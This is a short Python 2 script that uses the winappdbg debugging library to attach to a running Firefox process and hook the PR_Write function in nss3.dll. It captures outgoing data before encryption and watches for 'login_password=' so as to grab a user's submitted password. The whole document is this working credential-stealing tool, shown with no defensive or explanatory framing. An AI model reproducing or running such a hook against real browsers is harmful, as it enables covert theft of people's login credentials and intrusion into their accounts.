from winappdbg import Debug, EventHandler, System, Process
import sys


store = ''


def PR_Write( event, ra ,arg1 ,arg2, arg3):

    
    global store
    store = store +  process.read( arg2,1024 )
    
    if 'login_password=' in store:
        print '[+] Password is Found ... Debugging is stopped'
        try:
            debug.stop()
        except Exception,e:
            pass
      


class MyEventHandler( EventHandler ):
    
    def load_dll( self, event ):

        module = event.get_module()
        if module.match_name("nss3.dll"):
            pid = event.get_pid()
            address = module.resolve( "PR_Write" )
            print '[+] Found  PR_Write  at addr ' + str(address)
            event.debug.hook_function( pid, address, preCB=PR_Write, postCB=None ,paramCount=3,signature=None)


debug = Debug(MyEventHandler())


try:
    for ( process, name ) in debug.system.find_processes_by_filename( "firefox.exe" ):
        print '[+] Found Firefox PID is ' +  str (process.get_pid())
    debug.attach( process.get_pid() )
    debug.loop()
    

finally:
    debug.stop()